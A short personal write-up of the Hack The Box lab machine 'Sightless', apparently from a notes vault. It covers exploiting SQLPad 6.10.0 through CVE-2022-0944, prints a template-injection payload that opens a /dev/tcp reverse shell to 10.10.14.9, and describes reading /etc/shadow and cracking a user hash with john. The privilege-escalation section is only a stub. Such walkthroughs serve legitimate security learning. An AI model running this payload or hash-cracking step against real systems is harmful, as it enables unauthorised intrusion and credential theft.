
2024-11-02 11:18

Source:  #htb #privesc #Boot2root 
### Foothold

The target system has only three open ports: 21 (ftp), 22 (ssh), and 80 (http)
port 80 has a website and the website offers some services. Among the available services, there’s a redirection to `sqlpad.sightless.htb`. To access this service, ensure that you add the domain `sqlpad.sightless.htb` to your hosts file.
### Exploit

The installed version of SQLPad, identified as 6.10.0, can be found via BurpSuite or by clicking `info` on the top right hand of the screen. While analyzing the vulnerabilities in this version, it was discovered that it is affected by CVE-2022-0944. ([Link](https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb))

Manual method for the exploit is as follows- 
- set up a listener by using `nc -lvnp 9000`
	1. **Click on “Connection”**
	2. **Create a New Connection**
	3. **Choose MySQL as the Database**
	4. **Enter the Payload or credentials into the Database**
	5. **Test the Connection** to ensure the configuration is correct and the connection is successful.

**Payload**  - 
```
{{ process.mainModule.require(‘child_process’).exec(‘bash -c “bash -i >& /dev/tcp/10.10.14.9/9001 0>&1”’) }}
```
if this doesn't work refer [this post](https://www.reddit.com/r/hackthebox/comments/1fiba4r/stuck_on_sightless_box/)

This CVE also has a prebuilt exploit that can be found in the References section 
### User Flag

Upon further examination, I discovered that the `.dockerenv` file is indeed present, confirming the application is running within a Docker container. Additionally, after inspecting the system’s users, I identified two accounts: one belonging to “michael” and another to “node.”

access the `/etc/shadow` file and we see hashes of michael user 
copy the hash completely in a file named `hash` and use john to crack it 
```sh
john hash -w=/usr/share/wordlists/rockyou.txt
```
### Priv esc







get linpeas in your system via wget 
[[File transfer]]


jabhi wget use kar raha hai file transfer ke liye toh apne kali mei hi karna server shuru, windows mei nhi

### References
https://app.hackthebox.com/machines/624

Exploit - https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944

https://thecybersecguru.com/ctf-walkthroughs/mastering-sightless-beginners-guide-from-hackthebox/
[Hack The Box Sightless Writeup. Introduction | by Noob | Dec, 2024 | Medium](https://medium.com/@muaaz.ahmed23105/hack-the-box-sightless-writeup-c0a8dc6c8245)